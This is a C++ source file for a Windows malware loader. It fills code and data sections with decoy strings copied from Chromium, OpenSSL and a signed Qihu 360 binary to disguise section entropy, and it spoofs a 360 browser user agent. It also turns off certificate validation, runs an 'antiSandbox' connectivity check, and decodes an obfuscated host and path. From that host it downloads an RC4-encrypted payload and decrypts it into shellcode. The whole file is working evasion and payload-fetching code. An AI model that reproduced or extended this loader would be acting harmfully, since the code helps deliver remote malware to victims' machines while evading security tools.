#pragma warning(disable:4996)

// allows us to the fix the entropy of any section
#pragma code_seg(".text")
__declspec(allocate(".text")) const char* e1[] = { "---------------------------7d9114302a0cb6", "Vector Permutation AES for x86/SSSE3, Mike Hamburg (Stanford University)", "too many files open in system", "Resource temporarily unavailable" , "../../third_party/perfetto/src/protozero/scattered_heap_buffer.cc" , "../../base/trace_event/trace_log.cc" , "Histogram.MismatchedConstructionArguments" , "web_cache/Encoded_size_duplicated_in_data_urls" , "2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA" , "Beijing Qihu Technology Co., Ltd.0" };
#pragma code_seg(".data")
__declspec(allocate(".data")) const char* e2[] = { "GHASH for x86, CRYPTOGAMS by <appro@openssl.org>", "inappropriate io control operation", "illegal byte sequence" , "no such file or directory", "Inappropriate I/O control operation", "Content-Disposition: form-data; name=\"", "disabled-by-default-java-heap-profiler" , "disabled-by-default-devtools.timeline.invalidationTracking" , "Unsupported (crbug.com/1225176)\"" , "net/http_network_session_0x?/ssl_client_session_cache" , "net/url_request_context/isolated_media/0x?/cookie_monster/tasks_pending_global" , "Ihttp://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl0" ,"Beijing Qihu Technology Co., Ltd.0" };

#include "utils/b64_rc4_hex.h"
#include "utils/tools.h"

#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")


std::string encdomain = "f9W9fLf9fAq9f4fmf92wQ4fof9/9f4Xtf9/9c3==";
std::string encresource = "fA29fTXt19iCQ42M";
std::string enckey = "0123456789abcdefghijklmnopqrstuv";


std::string httpGet(std::string domain, std::string resource)
{
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17 QIHU 360EE",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
    {
        // Use WinHttpSetTimeouts to set a new time-out values.
        if (WinHttpSetTimeouts(hSession, 0, 10000, 0, 0))
            hConnect = WinHttpConnect(hSession, stringToLPCWSTR(domain), 80, 0);
    }

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", stringToLPCWSTR(resource),
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    BOOL bRet = FALSE;
    bRet = WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    bRet = WinHttpSetOption(hRequest, WINHTTP_OPTION_CLIENT_CERT_CONTEXT, WINHTTP_NO_CLIENT_CERT_CONTEXT, 0);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);


    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left.
    if (bResults)
    {
        std::string data;

        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else
                    data += pszOutBuffer;
                //    printf("%s", pszOutBuffer);

                //// Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);

        return data;
    }

    // Report any errors.
    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

void antiSandbox()
{
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17 QIHU 360EE",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
    {
        // Use WinHttpSetTimeouts to set a new time-out values.
        if (WinHttpSetTimeouts(hSession, 0, 100000, 0, 0))
            hConnect = WinHttpConnect(hSession, L"www.google.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    }

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/robots.txt",
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

std::string GetShellcodeFromUrl()
{
    std::string data = httpGet(hex_decode(base64_decode(encdomain)), hex_decode(base64_decode(encresource)));
    std::string shellcode_str = rc4_encrypt_decrypt(hex_decode(base64_decode(data)), enckey);
    return shellcode_str;
}